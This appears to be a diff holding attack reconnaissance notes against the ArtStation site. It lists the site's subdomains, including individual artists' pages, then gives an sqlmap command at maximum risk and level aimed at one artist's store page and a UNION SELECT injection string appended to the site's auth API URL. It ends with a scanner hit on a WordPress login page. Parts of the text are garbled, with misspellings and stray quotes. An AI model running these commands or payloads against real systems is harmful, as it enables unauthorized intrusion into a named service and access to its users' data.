@@ -1,1 +1,45 @@
-www.artstation.com
+
+
+{
+    """
+amp.artstation.com
+andrewariza.artstation.com
+anngelicaparent.artstation.com
+cdn.artstation.com
+cdna.artstation.com
+cdnb.artstation.com
+cdnc.artstation.com
+help.artstation.com
+inkognit.artstation.com
+jakubfajtanowski.artstation.com
+jiwooklee.artstation.com
+loganbailey.artstation.com
+magazine.artstation.com
+marleenvijgen.artstation.com
+olieart.artstation.com
+pixls.artstation.com
+reneenejo.artstation.com
+ruohantang.artstation.com
+shop.artstation.com
+sidwill.artstation.com
+sketchzombie.artstation.com
+status.artstation.com
+victorbravo.artstation.com
+walkerxhikari.artstation.com
+will99au.artstation.com
+z18458776.artstation.com
+    """
+}
+
+"""sqlmap --url="https://victorbravo.artstation.com/store?category_id=1" 
+-parser category_id --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --os=Linux --banner --dbs
+https://www.artstation.com/api/v2/auth/
++uinon+select+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'///"""
+
+
+"""
+Login {Page }
+[wordpress-login] [http] [info] https://magazine.artstation.com/wp-login.php
+
+
+"""
